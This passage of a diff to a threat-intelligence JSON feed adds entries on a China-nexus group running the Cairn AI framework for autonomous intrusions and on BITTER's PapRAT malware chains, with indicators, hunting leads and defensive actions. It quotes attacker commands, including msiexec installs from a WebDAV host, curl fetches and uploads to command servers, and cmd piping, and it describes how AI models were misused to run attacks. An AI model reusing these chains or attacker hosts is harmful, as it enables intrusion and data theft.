@@ -4,10 +4,10 @@
  "repository": "https://github.com/daniyyell-dev/rapid-threat-intel",
  "documentation": "https://github.com/daniyyell-dev/rapid-threat-intel/blob/main/docs/dashboard.md",
  "licence": "MIT",
- "last_updated": "2026-11-12 15:52",
- "threat_count": 34,
- "indicator_count": 1069,
- "block_now_count": 380,
+ "last_updated": "2026-11-12 18:20",
+ "threat_count": 36,
+ "indicator_count": 1089,
+ "block_now_count": 400,
  "combined_files": [
   {
    "name": "block_now.txt",
@@ -102,6 +102,830 @@
   }
  ],
  "threats": [
+  {
+   "id": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions",
+   "folder": "threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions",
+   "name": "CL-STA-1238: Autonomous AI Intrusions with the Cairn Framework Against Semiconductor, Defence and Civil Society",
+   "short": "CL-STA-1238 Cairn",
+   "category": "Nation-state / AI-driven intrusion",
+   "published": "2026-11-12",
+   "entry_date": "2026-11-12 18:20",
+   "last_updated": "2026-11-12",
+   "seq": 36,
+   "headline": "China-nexus operator running the Cairn AI pentest framework autonomously against semiconductor, defence and civil-society targets",
+   "summary": "Unit 42 reports that from August to September 2026 Chinese-speaking attackers, tracked as CL-STA-1238 and assessed with moderate confidence as China-nexus intelligence collection, ran a customised fork of the open-source Cairn penetration-testing framework with the Zhipu GLM and DeepSeek models to run 25 largely autonomous operations against at least 19 organisations. Targets were the semiconductor and advanced-manufacturing supply chain, defence and defence policy, and human-rights and civil-society groups. The operator gave each task a root domain and a one-line goal, sometimes with VPN gateway addresses, group names and shared passwords gathered beforehand, and the framework planned and ran reconnaissance, web and middleware exploitation, credential collection and persistence on its own for 20 minutes to more than 50 hours. Unit 42 confirmed access or data theft at 10 organisations through weak-password spraying, brute-forced production credentials, unauthenticated account-creation bypasses, insecure direct object references, mass-assignment privilege escalation, exposed cloud storage and old public CVEs, leading to new administrator accounts and a persistent API token in one production system, more than one million member records at another and an overwritten standards-ballot document. The Cairn hosting server and the staging and egress server are on the block list.",
+   "caveat": "Single-source indicators (Unit 42); both are attacker-run VPS addresses and may be reassigned later, so review older hits in context. The intrusions used known weaknesses rather than malware, so the IPs are the only published network indicators.",
+   "targets": {
+    "countries": [
+     {
+      "code": "US",
+      "name": "United States"
+     },
+     {
+      "code": "CA",
+      "name": "Canada"
+     }
+    ],
+    "regions": [
+     "North America"
+    ],
+    "sectors": [
+     "Semiconductors",
+     "Manufacturing",
+     "Defence",
+     "Government / policy",
+     "Civil society",
+     "Education"
+    ],
+    "note": "Unit 42 names a U.S. defence-policy programme, a U.S. teachers' union and a Canadian human-rights body among 19 targeted organisations, alongside semiconductor, manufacturing and standards organisations whose countries are not stated.",
+    "source": {
+     "url": "https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/",
+     "label": "Unit 42 – Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors",
+     "name": "Unit 42"
+    }
+   },
+   "mitre": [
+    {
+     "id": "T1583.003",
+     "name": "Virtual Private Server",
+     "url": "https://attack.mitre.org/techniques/T1583/003/"
+    },
+    {
+     "id": "T1595",
+     "name": "Active Scanning",
+     "url": "https://attack.mitre.org/techniques/T1595/"
+    },
+    {
+     "id": "T1110.003",
+     "name": "Password Spraying",
+     "url": "https://attack.mitre.org/techniques/T1110/003/"
+    },
+    {
+     "id": "T1110.001",
+     "name": "Password Guessing",
+     "url": "https://attack.mitre.org/techniques/T1110/001/"
+    },
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    {
+     "id": "T1078",
+     "name": "Valid Accounts",
+     "url": "https://attack.mitre.org/techniques/T1078/"
+    },
+    {
+     "id": "T1136",
+     "name": "Create Account",
+     "url": "https://attack.mitre.org/techniques/T1136/"
+    },
+    {
+     "id": "T1098",
+     "name": "Account Manipulation",
+     "url": "https://attack.mitre.org/techniques/T1098/"
+    },
+    {
+     "id": "T1530",
+     "name": "Data from Cloud Storage",
+     "url": "https://attack.mitre.org/techniques/T1530/"
+    },
+    {
+     "id": "T1565.001",
+     "name": "Stored Data Manipulation",
+     "url": "https://attack.mitre.org/techniques/T1565/001/"
+    }
+   ],
+   "recommended_actions": [
+    "Block 154.44.31.4 and 82.29.129.54 and search 90 days of firewall, WAF, VPN and identity logs for them, especially from August 2026.",
+    "Review internet-facing applications for password spraying and brute force from a single source, and enforce MFA and lockout on partner-integration, CMS and VPN logins.",
+    "Look for new administrator accounts, new API tokens and self-registered accounts on internet-facing applications that nobody requested.",
+    "Close open self-registration and backend registration endpoints, fix insecure direct object references and mass-assignment flaws, and patch old public CVEs on exposed services."
+   ],
+   "sources": [
+    {
+     "url": "https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/",
+     "label": "Unit 42 – Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors",
+     "name": "Unit 42"
+    },
+    {
+     "url": "https://www.helpnetsecurity.com/2026/11/12/cairn-autonomous-ai-cyberattacks/",
+     "label": "Help Net Security – Attackers breached 10 organizations with an open-source AI pentest framework",
+     "name": "Help Net Security"
+    }
+   ],
+   "indicator_count": 2,
+   "block_now_count": 2,
+   "hunt_count": 0,
+   "hunt_counts": {},
+   "indicator_counts": {
+    "ipv4": 2
+   },
+   "ioas": [],
+   "ioa_count": 0,
+   "ioa_note": null,
+   "files": [
+    {
+     "name": "block_now.txt",
+     "label": "Block list",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/block_now.txt",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_block_now.txt"
+    },
+    {
+     "name": "defender_xdr_indicators.csv",
+     "label": "Defender XDR import",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/defender_xdr_indicators.csv",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_defender_xdr_indicators.csv"
+    },
+    {
+     "name": "hunt.kql",
+     "label": "Hunting query (KQL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/hunt.kql",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_hunt.kql"
+    },
+    {
+     "name": "hunt.spl",
+     "label": "Hunting query (SPL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/hunt.spl",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_hunt.spl"
+    },
+    {
+     "name": "hunt_raw.spl",
+     "label": "Hunting query (SPL, raw events)",
+     "note": "hunt_raw.spl, for data not mapped to CIM",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/hunt_raw.spl",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_hunt_raw.spl"
+    },
+    {
+     "name": "hunt.yaral",
+     "label": "Hunting query (YARA-L 2.0)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/hunt.yaral",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_hunt.yaral"
+    },
+    {
+     "name": "iocs.csv",
+     "label": "All indicators (CSV)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/iocs.csv",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_iocs.csv"
+    }
+   ],
+   "repo_url": "https://github.com/daniyyell-dev/rapid-threat-intel/tree/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions",
+   "indicators": [
+    {
+     "value": "154.44.31.4",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Hong Kong server that hosted the attackers' customised Cairn autonomous attack framework and its controller login page.",
+     "source_url": "https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/",
+     "source_label": "Unit 42 – Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors",
+     "source_name": "Unit 42",
+     "sources": [
+      {
+       "url": "https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/",
+       "name": "Unit 42"
+      },
+      {
+       "url": "https://www.helpnetsecurity.com/2026/11/12/cairn-autonomous-ai-cyberattacks/",
+       "name": "Help Net Security"
+      }
+     ]
+    },
+    {
+     "value": "82.29.129.54",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Staging server and attack egress the Cairn operations used to scan and attack targets.",
+     "source_url": "https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/",
+     "source_label": "Unit 42 – Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors",
+     "source_name": "Unit 42",
+     "sources": [
+      {
+       "url": "https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/",
+       "name": "Unit 42"
+      },
+      {
+       "url": "https://www.helpnetsecurity.com/2026/11/12/cairn-autonomous-ai-cyberattacks/",
+       "name": "Help Net Security"
+      }
+     ]
+    }
+   ],
+   "queries": [
+    {
+     "platform": "Defender XDR",
+     "language": "KQL",
+     "name": "hunt.kql",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/hunt.kql",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_hunt.kql"
+    },
+    {
+     "platform": "Splunk",
+     "language": "SPL",
+     "name": "hunt.spl",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/hunt.spl",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_hunt.spl",
+     "alt": {
+      "label": "No CIM? Raw-search version",
+      "name": "hunt_raw.spl",
+      "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/hunt_raw.spl",
+      "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_hunt_raw.spl"
+     }
+    },
+    {
+     "platform": "Google SecOps",
+     "language": "YARA-L 2.0",
+     "name": "hunt.yaral",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/CL-STA-1238-Cairn-Autonomous-AI-Intrusions/hunt.yaral",
+     "download": "CL-STA-1238-Cairn-Autonomous-AI-Intrusions_hunt.yaral"
+    }
+   ]
+  },
+  {
+   "id": "BITTER-PapRAT-WmRAT-South-Asia-Espionage",
+   "folder": "threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage",
+   "name": "BITTER PapRAT and WmRAT: ftp.exe, VHDX and WebDAV MSI Espionage Chains",
+   "short": "BITTER PapRAT",
+   "category": "Nation-state / espionage",
+   "published": "2026-11-02",
+   "entry_date": "2026-11-12 18:20",
+   "last_updated": "2026-11-12",
+   "seq": 35,
+   "headline": "BITTER espionage chains using ftp.exe, VHDX and WebDAV MSI installs to drop PapRAT and WmRAT",
+   "summary": "FortiGuard Labs attributes with high confidence to BITTER, a suspected South Asian espionage group active since 2013 that targets government, energy and engineering organisations, a campaign against South Asian organisations built on three infection chains and a new remote access trojan, PapRAT. In chain 1, a LNK lure runs the native ftp.exe, whose ! prefix pipes res.ico to cmd; the script creates scheduled tasks such as MicrosoftUpdates\\updates11678 and BiosUpdates\\update101 that run 'conhost --headless cmd /c more <file>|cmd' on files in C:\\users\\public\\music\\err.log or C:\\programdata\\talk.log, refreshed with curl from goodnfortunes.com and techtalkhelp.com, uploads a reconnaissance file to goodnfortunes.com/ucl.php and shows a fake 'Explorer was unable to open this file!' message. In chain 2, a VHDX image holds a LNK that runs 'cmd.exe /c Visa_Details.msi & Attachment-2.xls', and the MSI's only action is a Type 194 custom action that drops PapRAT disguised as bruzsvc.exe ('Microsoft redistributables'). In chain 3, Invitation 2026.url opens a WebDAV share on rappellingaart.com and the next stage runs 'msiexec /i \\\\rappellingaart.com@SSL\\secure-docs\\Imp_Details.msi /qn'. PapRAT, in C++ and Rust builds, polls rivingtonclarks.com or chestergreenfarming.com over HTTP and downloaded WmRAT (vnces.exe), which talks to netmansrvdns.com. All eight domains, five URLs and five hashes are on the block list.",
+   "caveat": "The victims FortiGuard Labs saw are concentrated in South Asia, but the lures and LOLBin chains work against any Windows estate. The ftp.exe and conhost --headless behaviours are strong leads; MSI installs from WebDAV can occur in some software-distribution setups, so baseline them first.",
+   "targets": {
+    "countries": [],
+    "regions": [
+     "South Asia"
+    ],
+    "sectors": [],
+    "note": "FortiGuard Labs says the campaign targeted South Asian organisations and C2 telemetry is concentrated in South Asia; it names no specific countries or sectors for this campaign.",
+    "source": {
+     "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "name": "Fortinet"
+    }
+   },
+   "mitre": [
+    {
+     "id": "T1566.001",
+     "name": "Spearphishing Attachment",
+     "url": "https://attack.mitre.org/techniques/T1566/001/"
+    },
+    {
+     "id": "T1204.002",
+     "name": "Malicious File",
+     "url": "https://attack.mitre.org/techniques/T1204/002/"
+    },
+    {
+     "id": "T1553.005",
+     "name": "Mark-of-the-Web Bypass",
+     "url": "https://attack.mitre.org/techniques/T1553/005/"
+    },
+    {
+     "id": "T1202",
+     "name": "Indirect Command Execution",
+     "url": "https://attack.mitre.org/techniques/T1202/"
+    },
+    {
+     "id": "T1053.005",
+     "name": "Scheduled Task",
+     "url": "https://attack.mitre.org/techniques/T1053/005/"
+    },
+    {
+     "id": "T1218.007",
+     "name": "Msiexec",
+     "url": "https://attack.mitre.org/techniques/T1218/007/"
+    },
+    {
+     "id": "T1036.005",
+     "name": "Match Legitimate Name or Location",
+     "url": "https://attack.mitre.org/techniques/T1036/005/"
+    },
+    {
+     "id": "T1105",
+     "name": "Ingress Tool Transfer",
+     "url": "https://attack.mitre.org/techniques/T1105/"
+    },
+    {
+     "id": "T1071.001",
+     "name": "Web Protocols",
+     "url": "https://attack.mitre.org/techniques/T1071/001/"
+    },
+    {
+     "id": "T1082",
+     "name": "System Information Discovery",
+     "url": "https://attack.mitre.org/techniques/T1082/"
+    },
+    {
+     "id": "T1518.001",
+     "name": "Security Software Discovery",
+     "url": "https://attack.mitre.org/techniques/T1518/001/"
+    },
+    {
+     "id": "T1113",
+     "name": "Screen Capture",
+     "url": "https://attack.mitre.org/techniques/T1113/"
+    },
+    {
+     "id": "T1041",
+     "name": "Exfiltration Over C2 Channel",
+     "url": "https://attack.mitre.org/techniques/T1041/"
+    }
+   ],
+   "recommended_actions": [
+    "Block the eight BITTER domains, five URLs and five hashes (they are in the Defender XDR import file) and search 90 days of DNS and proxy logs for them.",
+    "Hunt for ftp.exe launched by explorer.exe or a LNK that spawns cmd.exe, and for scheduled tasks named MicrosoftUpdates\\updates* or BiosUpdates\\update* that run 'conhost --headless cmd /c more ...|cmd'.",
+    "Alert on msiexec installing a package from a UNC path containing @SSL (WebDAV), and on files named bruzsvc.exe or vnces.exe or curl writing to C:\\users\\public\\music\\err.log or C:\\programdata\\talk.log.",
+    "Block or quarantine VHDX, VHD and .url attachments at the mail gateway; if a host is confirmed, isolate it, delete the scheduled tasks and rotate the user's credentials."
+   ],
+   "sources": [
+    {
+     "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "name": "Fortinet"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/1943932/",
+     "label": "ThreatFox – rappellingaart.com payload delivery (IOC 1943932)",
+     "name": "ThreatFox"
+    },
+    {
+     "url": "https://thehackernews.com/2026/11/bitter-hackers-deploy-new-paprat.html",
+     "label": "The Hacker News – Bitter Hackers Deploy New PapRAT Backdoor in Cyberespionage Campaign Targeting South Asia",
+     "name": "The Hacker News"
+    }
+   ],
+   "indicator_count": 18,
+   "block_now_count": 18,
+   "hunt_count": 0,
+   "hunt_counts": {},
+   "indicator_counts": {
+    "domain": 8,
+    "sha256": 5,
+    "url": 5
+   },
+   "ioas": [
+    {
+     "artefact": "ftp.exe launched from a LNK (parent explorer.exe or cmd.exe) that then spawns cmd.exe, followed within 10 minutes by schtasks /create on the same device",
+     "log_source": "EDR process events (DeviceProcessEvents), Windows Security 4688 with command line, Sysmon 1",
+     "why": "In BITTER's chain 1 the LNK runs ftp.exe, whose ! prefix pipes res.ico to cmd (\"!more res.ico\"), and the script immediately creates a scheduled task. FortiGuard Labs notes this LOLBin chain avoids script-engine monitoring aimed at PowerShell or wscript. ftp.exe is rarely used interactively on modern endpoints, so a child cmd.exe is a strong lead.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_name": "Fortinet",
+     "title": "ftp.exe spawning cmd, then a scheduled task",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    },
+    {
+     "artefact": "Scheduled tasks named MicrosoftUpdates\\updates<digits> or BiosUpdates\\update<digits> that run conhost --headless cmd /c more <file>|cmd",
+     "log_source": "EDR process events, Windows Security 4698 (scheduled task created), Task Scheduler operational log",
+     "why": "FortiGuard Labs shows tasks MicrosoftUpdates\\updates11678, MicrosoftUpdates\\updates88679 and BiosUpdates\\update101 that re-read C:\\users\\public\\music\\err.log or C:\\programdata\\talk.log every 15 to 49 minutes and pipe the content to cmd, so commands change server-side without a new binary. Task names change between victims; the conhost --headless ... more ...|cmd pattern is the steadier signal.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_name": "Fortinet",
+     "title": "Fake update tasks piping a log file to cmd",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    },
+    {
+     "artefact": "curl writing to C:\\users\\public\\music\\err.log or C:\\programdata\\talk.log, or posting a file with -F file=@ to a ucl.php endpoint",
+     "log_source": "EDR process and file events, proxy logs",
+     "why": "The BITTER scripts fetch commands with curl --ssl-no-revoke -k into these fake log files and upload a reconnaissance file (abc.pdf with directory listings, tasklist, antivirus products and drives) with curl -X POST -F to ucl.php.",
+     "action": "hunt",
+     "has_query": true,
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_name": "Fortinet",
+     "title": "curl fetching commands into fake log files",
+     "queries": [
+      "KQL",
+      "SPL"
+     ]
+    },
+    {
+     "artefact": "msiexec /i installing a package from a WebDAV UNC path containing @SSL (for example \\\\host@SSL\\secure-docs\\Imp_Details.msi /qn)",
+     "log_source": "EDR process events, Windows Security 4688, WebClient/WebDAV network logs",
+     "why": "In chain 3 an Internet Shortcut (Invitation 2026.url) opens a WebDAV share and the next script installs the PapRAT MSI silently straight from it, so mail and browser attachment controls never see the MSI.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_name": "Fortinet",
+     "title": "msiexec installing an MSI over WebDAV (@SSL)",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    },
+    {
+     "artefact": "A LNK launched from a mounted VHDX that runs cmd.exe /c <name>.msi & <name>.xls, installing an MSI and opening a decoy spreadsheet at the same time",
+     "log_source": "EDR process events, Windows Security 4688",
+     "why": "Chain 2 hides Visa_Details.msi and Attachment-2.xls beside a single visible LNK in \"Letter from the Ambassador - 11th Belt and Road Summit.vhdx\"; the MSI's only action is a Type 194 custom action that drops PapRAT as bruzsvc.exe.",
+     "action": "hunt",
+     "has_query": true,
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_name": "Fortinet",
+     "title": "VHDX LNK running an MSI with a decoy spreadsheet",
+     "queries": [
+      "KQL",
+      "SPL"
+     ]
+    }
+   ],
+   "ioa_count": 5,
+   "ioa_note": "Behaviours are leads, not confirmed indicators, and can match legitimate activity. Compare any hit against your own baseline and environment before acting.",
+   "files": [
+    {
+     "name": "block_now.txt",
+     "label": "Block list",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/block_now.txt",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_block_now.txt"
+    },
+    {
+     "name": "defender_xdr_indicators.csv",
+     "label": "Defender XDR import",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/defender_xdr_indicators.csv",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_defender_xdr_indicators.csv"
+    },
+    {
+     "name": "hunt.kql",
+     "label": "Hunting query (KQL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/hunt.kql",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_hunt.kql"
+    },
+    {
+     "name": "hunt.spl",
+     "label": "Hunting query (SPL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/hunt.spl",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_hunt.spl"
+    },
+    {
+     "name": "hunt_raw.spl",
+     "label": "Hunting query (SPL, raw events)",
+     "note": "hunt_raw.spl, for data not mapped to CIM",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/hunt_raw.spl",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_hunt_raw.spl"
+    },
+    {
+     "name": "hunt.yaral",
+     "label": "Hunting query (YARA-L 2.0)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/hunt.yaral",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_hunt.yaral"
+    },
+    {
+     "name": "iocs.csv",
+     "label": "All indicators (CSV)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/iocs.csv",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_iocs.csv"
+    }
+   ],
+   "repo_url": "https://github.com/daniyyell-dev/rapid-threat-intel/tree/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage",
+   "indicators": [
+    {
+     "value": "netmansrvdns.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "WmRAT command-and-control domain; WmRAT (vnces.exe) is the second-stage implant PapRAT downloads with its DWW command.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "rappellingaart.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "WebDAV host for attack chain 3: Invitation 2026.url opens rappellingaart.com@SSL/secure-docs and the next stage runs msiexec on Imp_Details.msi from it.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/1943932/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "techtalkhelp.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Serves talk.log, the Base64-encoded command file that the BiosUpdates\\update101 scheduled task runs every 15 minutes in attack chain 1.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      },
+      {
+       "url": "https://thehackernews.com/2026/11/bitter-hackers-deploy-new-paprat.html",
+       "name": "The Hacker News"
+      }
+     ]
+    },
+    {
+     "value": "rivingtonclarks.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PapRAT C2 panel domain (C++ build at /beautiQuewonders/banaNa.php, Rust build at /banana/).",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      },
+      {
+       "url": "https://thehackernews.com/2026/11/bitter-hackers-deploy-new-paprat.html",
+       "name": "The Hacker News"
+      }
+     ]
+    },
+    {
+     "value": "goodnfortunes.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Attack chain 1 C2: scheduled tasks pull commands from /b99/?kq=<computername> and reconnaissance output is uploaded to /ucl.php.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      },
+      {
+       "url": "https://thehackernews.com/2026/11/bitter-hackers-deploy-new-paprat.html",
+       "name": "The Hacker News"
+      }
+     ]
+    },
+    {
+     "value": "felixfuturenext.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Campaign domain FortiGuard Labs lists in its BITTER PapRAT IOCs (/Epistemological/ path).",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "gomescareerplans.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Attack chain 3 command server: the MicrosoftUpdates\\updates88679 task runs curl against /docs/?vid=<computername> and pipes the reply to cmd.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "chestergreenfarming.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PapRAT C2 decoded from Imp_Details.msi in attack chain 3 (www.chestergreenfarming.com), the build that delivered WmRAT.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "https://techtalkhelp.com/talk.log",
+     "type": "url",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Encoded command file downloaded with curl -o C:\\programdata\\talk.log in attack chain 1.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "http://www.rivingtonclarks.com/beautiQuewonders/banaNa.php",
